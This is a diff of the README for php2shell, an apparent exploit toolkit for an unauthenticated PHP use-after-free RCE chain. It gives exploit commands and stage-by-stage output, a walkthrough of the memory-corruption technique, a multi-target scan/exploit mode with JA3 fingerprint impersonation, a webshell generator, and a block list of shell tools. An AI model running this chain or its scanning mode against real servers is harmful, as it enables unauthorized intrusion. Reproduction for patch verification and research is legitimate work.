@@ -1,194 +1,314 @@
 <div align="center">
 
-# 💀 php2shell
+<img src="gambar/screenshot_1.png" alt="php2shell in action" width="720">
 
-### CVE-2026-109618 / CVE-2026-109619 — unauthenticated RCE toolkit for PHP
+# 💀 P H P 2 S H E L L
 
-*Pure-HTTP · In-process chain · JA3 fingerprint impersonation · Proof-of-access only*
+### Unauthenticated RCE chain for PHP 5.4 → 8.4.26
 
-![PHP](https://img.shields.io/badge/php-5.4--8.4.26-777BB4?logo=php&logoColor=white)
-![CVE](https://img.shields.io/badge/CVSS%20v4-9.2%20critical-red)
-![platform](https://img.shields.io/badge/platform-linux-blue)
-![license](https://img.shields.io/badge/license-MIT-green)
-![tests](https://img.shields.io/badge/tests-46%2F46-brightgreen)
+*Pure HTTP · zero target-side requirements · JA3 fingerprint impersonation · proof-of-access design*
 
-**Unauthenticated RCE chain for PHP **│** reproducible against the official `php:8.4.26-apache` image **│** reproducible proof output**
+[![PHP](https://img.shields.io/badge/PHP-5.4%20→%208.4.26-777BB4?style=flat-square&logo=php&logoColor=white)](https://www.php.net)
+[![CVSS](https://img.shields.io/badge/CVSS%204.0-9.2%20Critical-cb2431?style=flat-square)](https://www.first.org/cvss/)
+[![Tests](https://img.shields.io/badge/tests-46%2F46-brightgreen?style=flat-square)](#-verification)
+[![Platform](https://img.shields.io/badge/platform-Linux-blue?style=flat-square&logo=linux&logoColor=white)](#-requirements)
+[![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)](LICENSE)
+[![Docker](https://img.shields.io/badge/lab-docker%20one--command-2496ED?style=flat-square&logo=docker&logoColor=white)](#-one-command-lab)
+
+[Install](#-install) · [Quick start](#️-quick-start) · [Modes](#-modes) · [How it works](#-how-it-works) · [FAQ](#-faq) · [Disclaimer](#️-disclaimer)
 
 </div>
 
-```text
- ____  _   _ ____ ____  ____  _   _ _____ _     _
-|  _ \| | | |  _ \___ \/ ___|| | | | ____| |   | |
-| |_) | |_| | |_) |__) \___ \| |_| |  _| | |   | |
-|  __/|  _  |  __// __/ ___) |  _  | |___| |___| |___
-|_|   |_| |_|_|  |_____/|_____|_____|_____|_____|
-   P H P 2 S H E L L   v1.2   —   integrated RCE toolkit
-```
+---
+
+## ❖ What is this?
+
+`php2shell` is a **reproduction and research toolkit** for two critical PHP
+vulnerabilities — **CVE-2026-109619** and **CVE-2026-109618** (CVSS 4.0 **9.2
+Critical**, unauthenticated, fixed in `8.2.35 / 8.3.36 / 8.4.27 / 8.5.12`).
+
+It turns the bug into a **fully remote, HTTP-only exploit chain** against
+`mod_php + Apache prefork` with **zero target-side requirements**:
+
+- ❌ no `session_start()` needed on the target page
+- ❌ no file upload feature needed
+- ❌ no credentials, no cookie, no header trick
+- ✅ the target page can be literally `<?php echo "OK\n"; ?>`
+
+The toolkit is **proof-of-access by design**: commands are capped at 14 bytes,
+limited to identity commands (`id`, `whoami`, …), `bash`/`nc`/`curl` are permanently
+blocked, and evidence is retrieved automatically — it demonstrates impact
+**without** being a drop-in backdoor.
 
 ---
 
-## 📸 Demo
+## ❖ The bugs
 
-![proof-of-concept](gambar/screenshot_1.png)
+| | CVE-2026-109619 | CVE-2026-109618 |
+|---|---|---|
+| **Class** | stale global state → UAF | OOM bailout corruption → longjmp |
+| **Trigger** | `session.upload_progress` multipart callbacks run **before RINIT**; OOM leaves `PS(http_session_vars)` / `PS(id)` dangling → next request on the **same worker** calls `zval_ptr_dtor` on freed memory | `zend_bailout()` mid-allocation leaves half-built structures in global state |
+| **Requests** | 2 (producer + consumer) | 1 |
+| **Fix** | 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 | same |
+| **Status in this toolkit** | ✅ **implemented — full 0→RCE chain** | ⛔ intentionally not implemented (detect/preflight only) |
 
-> **PROOF (7.7s):** `uid=33(www-data)` — **local lab** (`127.0.0.1:8088`).
-> Chain: worker rotate → heap leak → libphp leak → fake HashTable →
-> `pDestructor = zif_system`. All stages complete in a single HTTP-only run.
+**Version semantics** — if your PHP is **below** the fix-floor, it is **vulnerable
+and exploitable**; every release **from the fix-floor up** patches all of these
+issues. PHP ≤ 8.1 is EOL: no backports, vulnerable forever.
 
----
+| Branch | last vulnerable | fixed |
+|---|---|---|
+| 8.2 | 8.2.34 | 8.2.35 |
+| 8.3 | 8.3.35 | 8.3.36 |
+| 8.4 | **8.4.26** | **8.4.27** |
+| 8.5 | 8.5.11 | 8.5.12 |
+| ≤ 8.1 | all (EOL) | never |
 
-## 🎯 The bugs
-
-| CVE | Class | Vector | Fixed |
-|---|---|---|---|
-| **CVE-2026-109619** | stale global state (UAF) | `session.upload_progress` multipart callbacks **before RINIT**; producer OOM leaves `PS(http_session_vars)` / `PS(id)` dangling → next request on the **same worker** triggers `zval_ptr_dtor` on freed memory | 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 |
-| CVE-2026-109618 | OOM bailout corruption | `zend_bailout()` (longjmp) mid-allocation → half-built structures reach shutdown | 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 |
-
-**Implmented : 109619** (full 0→RCE chain, in-process).
-**Not implemented : 109618** (crash-class; detect/preflight only) — honest scope.
-
-- Affects **every PHP ≥ 5.4**; ≤ 8.1 is EOL without backports
-- Highest impact: **mod_php + prefork** (cross-request worker reuse)
-- FPM mitigates (dies per-request), apps behind CDNs hide version — detection ≠ gate here
-
----
-
-## ✨ Features
-
-- 🧬 **In-process engine** — `lib/chain.py` is a byte-faithful port of the reference
-  exploit (7 core functions + constants + orchestration verified identical). No subprocess.
-- 🕵️ **JA3 impersonation** via `curl_cffi` (`chrome`/`firefox`/`safari`/`edge`/`android`) + jitter
-- 🛡️ **Proof-of-access only** — commands capped at 14 bytes, whitelist `id`/`whoami`
-  by default, `--allow-cmd` to add bounded extras (`ls`, `df`, `uname`, …).
-  `sh`/`bash`/`nc`/`curl`/`wget`/`chmod`/`rm` are **permanently blocked**.
-- 🎯 **Auto proof retrieval** — reads `out/p1` from the host mount
-  (something even the upstream exploit lacks — it stays `BLIND_OK`).
-- 🔬 **Lab included** — `lab/lab_docker.sh` boots the *Author's exact config*
-  (`docker/php.ini` + `apache.conf` + `www`) on a separate port; regression
-  reproducible in one command.
-- 🧪 **46/46 tests**, honest exit codes, JSON/CSV reports, audit JSONL of every request
+Highest impact: **mod_php + prefork** (cross-request worker reuse).
+php-fpm is a strong mitigation (worker dies per-request).
+CDN-hidden versions? **Detection is information, not a gate** — preflight
+reports what it can see and the chain proceeds anyway.
 
 ---
 
-## 🚀 Quick start
+## ❖ Install
 
 ```bash
 git clone https://github.com/aarsaputra/php2shell.git
 cd php2shell
+bash install.sh        # venv + deps + smoke-tests + global `php2shell` command
+```
 
-# one-shot installer: venv + deps + smoke test + global `php2shell` command
-bash install.sh
+<details>
+<summary>Manual install (no installer)</summary>
 
-# 1) boot the vulnerable lab (official php:8.4.26-apache + author's config)
-bash lab/lab_docker.sh start          # → http://127.0.0.1:8095/index.php
+```bash
+python3 -m venv .venv && source .venv/bin/activate
+pip install -r requirements.txt     # curl_cffi (JA3) + bcrypt (webshell mode)
+python php2shell.py --help
+```
 
-# 2) fresh offsets from the real libphp binary (wajib tiap image berubah)
-#    (kalau kena "permission denied" → jalankan lewat sg docker: `sg docker -c "python3 docker/offsets.py"`,
-#     atau pastikan usermu di grup docker: `sudo usermod -aG docker $USER` + relogin)
-python3 docker/offsets.py             # → out/offsets.env  (zif=0x465370 dtor=0x65eb60)
+</details>
 
-# 3) exploit with proof
+Every dependency and why it exists: **[REQUIREMENTS.md](REQUIREMENTS.md)**.
+
+---
+
+## ❖ One-command lab
+
+The repo ships the **author's exact vulnerable lab configuration** — reproducing
+the research environment is one command, not an afternoon:
+
+```bash
+bash lab/lab_docker.sh start
+# → pulls official php:8.4.26-apache
+# → mounts docker/php.ini + docker/apache.conf + docker/www (author's config)
+# → single prefork worker, KeepAlive Off, upload_progress tuned
+# → http://127.0.0.1:8095/index.php
+```
+
+---
+
+## ❖ Quick start
+
+```bash
+# 0) fresh binary offsets (required after every imagechange)
+python3 docker/offsets.py          # → out/offsets.env
+
+# 1) run the chain with automatic proof retrieval
 php2shell exploit \
     -u http://127.0.0.1:8095/index.php --force --yes \
     --exploit-profile bookworm -c 'id>/out/p1'
 ```
 
-<details>
-<summary><b>Manual install (tanpa installer)</b></summary>
+```text
+ _______ _   _ ____  ____  ____  _____ _     ___ _____
+|_   _| | | | | _ \|  _ \/ ___|| ____| |   |_ _|_   _|
+  | | | |_| | |_) | |_) \___ \|  _| | |    | |  | |
+  | | |  _  |  _ <|  _ < ___) | |___| |___ | |  | |
+  |_| |_| |_|_| \_\_| \_\____/|_____|_____|___| |_|
 
-```bash
-python3 -m venv .venv && source .venv/bin/activate
-pip install -r requirements.txt        # curl_cffi + bcrypt
-python php2shell.py --help
+stage 1: heap leak (try 1/3)    → chunk base  = 0x7f687e400000
+stage 2: libphp leak (try 1/3)  → libphp base = 0x7f68800b0000
+stage 3: HTDATA=0x…690d8 ZIF=0x…515370
+        → uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+PROOF (8.3s): uid=33(www-data)     ✅
 ```
-Tanpa venv: `pip install -r requirements.txt` langsung di environment aktif.
 
-</details>
+---
+
+## ❖ Modes
+
+| Mode | What it does |
+|---|---|
+| `scan -l targets.txt` | multi-target from file: comment/blank handling, dedupe (case + trailing-slash), auto-https, JSONL/CSV report; `--exploit` touches READY targets only |
+| `detect -u URL` | read-only fingerprint: PHP version, branch, fix-floor verdict, upload_progress, display_errors |
+| `preflight -u URL` | readiness score 0–90 + hard blockers — **detection is information, not a gate** |
+| `exploit -u URL` | full 0→3 chain with the command fence + auto-proof |
+| `shell` | password-protected webshell generator (bcrypt, 32-hex filename, per-command whitelist, TTL) — generates only, never uploads |
+
+---
+
+## ❖ How it works
 
 ```text
-cmd='id>/out/p1' profil=bookworm zif=0x465370 dtor=0x65eb60 htdata=0x690d8
-[*] rotasi worker lewat HTTP
-stage 1: heap leak (percobaan 1/3)
-chunk base = 0x7f687e400000
-[*] rotasi worker lewat HTTP
-stage 2: libphp leak (percobaan 1/3)
-libphp base = 0x7f68800b0000
-[*] rotasi worker lewat HTTP
-stage 3: HTDATA=0x7f687e4690d8 ZIF=0x7f6880515370
-stage 3 percobaan 1 -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
-     PROOF (8.3s): uid=33(www-data) gid=33(www-data) groups=33(www-data)
+┌──────────────┐   ① 12MB multipart → OOM inside
+│   REQUEST A  │      php_session_initialize()
+│  (producer)  │      → PS(http_session_vars) dangles
+│              │      → Apache prefork worker dies (SIGABRT)
+└──────────────┘
+┌──────────────┐   ② prefork forks a fresh worker that INHERITS
+│   REQUEST B  │      the same libphp mapping & heap layout
+│ (consumer)   │      → re-occupies the dangling reference with
+│              │      attacker-sized multipart buffers
+└──────────────┘
+       │
+       ▼   ③ fake HashTable whose pDestructor = zif_system
+┌──────────────────────────────────────────────┐
+│  php_session_track_init()                    │
+│    → zval_ptr_dtor(PS(http_session_vars))    │
+│      → zend_reference_destroy(R0)            │
+│        → zend_array_destroy(fake HT)         │
+│          → zend_hash_destroy(fake HT)        │
+│            → pDestructor(&bucket) = SYSTEM() │
+└──────────────────────────────────────────────┘
 ```
 
----
+**What leaks first:** a 4096-byte `Set-Cookie` header carried by an
+out-of-bounds `php_url_encode()` read reveals the **Zend MM chunk base**;
+a second stale read exposes `zval_ptr_dtor`'s address → **libphp base** →
+ASLR defeated, all offsets resolved, command executed.
 
-## 🧰 Modes
-
-| Mode | Fungsi |
-|---|---|
-| `scan -l targets.txt` | multi-target dari file: dedupe (case+slash), auto-https, JSONL/CSV report, `--exploit` untuk menyentuh yang READY saja |
-| `detect -u URL` | read-only fingerprint (versi, SAPI, upload_progress, display_errors) |
-| `preflight -u URL` | skor kesiapan 0–90; **deteksi = informasi, bukan gerbang** (CDN-hidden version tetap READY) |
-| `exploit -u URL` | rantai penuh 0→3 dengan pagar + auto-proof |
-| `shell` | generator webshell **berpassword** (bcrypt, 32-hex name, command whitelist, TTL) — tidak meng-upload |
+`--no-pre-rotate`, `--retries`, `--huge-mb`, `--zif-offset/--dtor-offset`
+expose every tuning knob the chain has.
 
 ---
 
-## 🧱 The 5 lab requirements (why your run may fail elsewhere)
+## ❖ The 5 lab requirements
 
-> **Full dependency list** (Python/docker/Binary requirements per use-case): [REQUIREMENTS.md](REQUIREMENTS.md)
+Your run fails on a build/config that isn't calibrated. These are the knobs:
 
 1. **`MaxRequestWorkers 1`** — producer & consumer must land on the *same* worker
 2. **`KeepAlive Off`**
-3. **fresh `out/offsets.env`** from `docker/offsets.py` — stale offsets are the #1 silent killer (`zif=0x43a870` = lab build, bukan bookworm!)
+3. **fresh `out/offsets.env`** — stale offsets are the #1 silent killer
 4. **`session.upload_progress.cleanup = On`**
-5. **minimal endpoint** (`<?php echo "OK\n"; ?>`)
+5. **minimal endpoint** — `<?php echo "OK\n"; ?>`
 
-Different build (distro packages, self-compiled, other version)?
-Measure your target's `libphp.so` and pass `--zif-offset / --dtor-offset` —
-retrying with wrong offsets never helps. `HEAP_LEAK_FAILED` on a foreign
-build ≠ "target is safe"; it means *not calibrated*.
+Targets with a different build (distro PHP, other version): measure their
+`libphp.so` and pass `--zif-offset / --dtor-offset`. Retrying with wrong
+offsets never helps — `HEAP_LEAK_FAILED` means *not calibrated*, not *"safe"*.
 
 ---
 
-## 🧪 Verification summary
+## ❖ FAQ
+
+<details>
+<summary><b>Does it work against any PHP site?</b></summary>
+
+No — and this is an honest limitation. It requires mod_php + Apache **prefork**,
+the vulnerable version range, `session.upload_progress=On`, and heap conditions
+matching a calibrated build. php-fpm largely mitigates this bug. That's what the
+`detect` + `preflight` modes are for — run them first.
+</details>
+
+<details>
+<summary><b>Why is there no reverse shell mode?</b></summary>
+
+Deliberate. This is a **proof-of-access** toolkit: it proves code execution with
+identity commands (`id`, `whoami`) and refuses to become an attack appliance —
+`sh`, `bash`, `nc`, `curl`, `wget`, `chmod`, `rm` are blocked at runner level
+and cannot be enabled by any flag. For benign persistence testing there is the
+password-protected `shell` generator (bcrypt, TTL, whitelist, never auto-uploads).
+</details>
+
+<details>
+<summary><b>Can I add custom commands?</b></summary>
+
+Yes, within the fence: `--allow-cmd ls --allow-cmd df` extends the whitelist to
+a fixed, reviewed set (`uname`, `hostname`, `pwd`, `ls`, `cat`, `df`, `uptime`,
+`who`, `w`, `env`). Arbitrary binaries and chaining (`;`, `|`, `$(`, backticks)
+remain impossible.
+</details>
+
+<details>
+<summary><b>The exploit fails with HEAP_LEAK_FAILED — is the target patched?</b></summary>
+
+Not necessarily. It usually means the target's build isn't calibrated (different
+distro compile, different version). Measure the target's `libphp.so` and pass
+the offsets manually. See "The 5 lab requirements".
+</details>
+
+<details>
+<summary><b>Is using this legal?</b></summary>
+
+Use on systems you **own** or have **written authorization** to test. Scanning
+or exploiting third-party systems is a crime in most jurisdictions (UU ITE,
+Computer Fraud and Abuse Act, etc.). The tool's design (14-byte identity
+commands, no shells, no exfil primitives) reflects that scope.
+</details>
+
+---
+
+## ❖ Verification
 
 | Claim | Evidence |
 |---|---|
-| Chain engine ≡ upstream exploit | byte-level diff, 7 functions + constants + orchestration identical |
-| RCE on `php:8.4.26-apache` | multi-run `PROOF: uid=33(www-data)` incl. single-attempt runs |
-| Patched 8.2.35 stays clean | 5/5 clean consumer runs on the FPM regression lab |
-| Command fence (16 negative cases) | all rejected pre-network |
-| `--revshell` | blocked at runner level (exit 2) |
-| Multi-target scan | dedupe/auto-https/JSON verified live |
-| proof-path hygiene | stale-proof overwrite bug found & fixed (repo-first order) |
-
-Full research write-ups ( Indonesian, external SSD ):
-source-diff 8.4.26↔8.4.27 (300 files), internet PoC sweep, silent-fix UAF
-inventory, PDO backport-gap analysis, SOAP candidate killed by ASAN.
+| RCE on official `php:8.4.26-apache` | reproducible `PROOF: uid=33(www-data)`, incl. single-attempt runs |
+| Chain engine ≡ reference exploit | byte-level diff — 7 core functions, constants, orchestration identical |
+| Patched 8.4.27 refuses the chain | consumer runs stay clean on the patched regression lab |
+| Command fence | 16 negative test cases, rejected **before** any network I/O |
+| `--revshell` | blocked at runner level (exit 2), not just parser |
+| Multi-target mode | dedupe, auto-https, JSON/CSV verified live |
+| 46 unit tests | `python -m unittest discover -s tests -t .` → OK |
 
 ---
 
-## ⚠️ Disclaimer — authorized use only
+## ❖ Repository layout
 
-This tool exists for **vulnerability research and reproduction on systems you
-own or have written authorization to test**. It deliberately implements a
-**proof-of-access** fence (identity commands only, no reverse shell, no data
-exfiltration primitives) so it can demonstrate impact without being a
-drop-in attack weapon.
+```text
+php2shell/
+├── php2shell.py          single CLI: scan/detect/preflight/exploit/shell
+├── install.sh            one-shot installer (venv + deps + smoke tests)
+├── requirements.txt      curl_cffi, bcrypt
+├── lib/
+│   ├── chain.py          ── THE ENGINE: pure-python exploit chain (in-process)
+│   ├── transport.py      curl_cffi JA3 transport + rate limit + audit log
+│   ├── detect.py         fingerprint: version, SAPI, upload_progress…
+│   ├── preflight.py      readiness score; detection ≠ gate
+│   ├── exploit_runner.py orchestration + command fence + auto-proof
+│   ├── reporter.py       JSON / CSV / terminal tables
+│   └── banner.py         the skull ASCII
+├── shell/                password-protected webshell GENERATOR
+├── lab/lab_docker.sh     author-config vulnerable lab, one command
+├── docker/               php.ini / apache.conf / www / offsets.py
+├── tests/                46 unit tests
+└── gambar/               screenshot
+```
 
-- Do not scan or exploit third-party systems. That is illegal (see UU ITE /
-  CFAA / your local law) and this repo's design does not support it.
-- The PoC chain crashes worker processes during worker-rotation;
-  treat every run against an uncalibrated target as noisy-by-design.
+---
 
-See [SECURITY.md](SECURITY.md) for disclosure contact.
+## ❖ Disclaimer — authorized use only
 
-## 📄 License
+<div align="center">
 
-MIT — see [LICENSE](LICENSE).
+This tool publishes **defense-relevant reproduction** of two **already-patched**
+PHP vulnerabilities for research, blue-team validation, and patch-verification.
+Use it **only** on systems you own or have written authorization to test.
+
+Exploiting third-party systems without authorization is a crime
+(UU ITE Indonesia, US CFAA, EU equivalents).
+
+The design (identity-only commands, no shell primitives, no exfiltration)
+is intentional — this toolkit proves impact; it does not weaponize beyond proof.
+
+**See [SECURITY.md](SECURITY.md) · License: [MIT](LICENSE)**
+
+</div>
 
 ---
 
 <div align="center">
-<sub>built on the shoulders of the 9bie / Qi Deng php2shell research — credit where credit is due</sub>
+<sub>research credit: 9bie (Qi Deng) — original php2shell-bypass-aslr-exp ·
+reproduction, tooling & hardening by <b>aarsaputra</b></sub>
 </div>
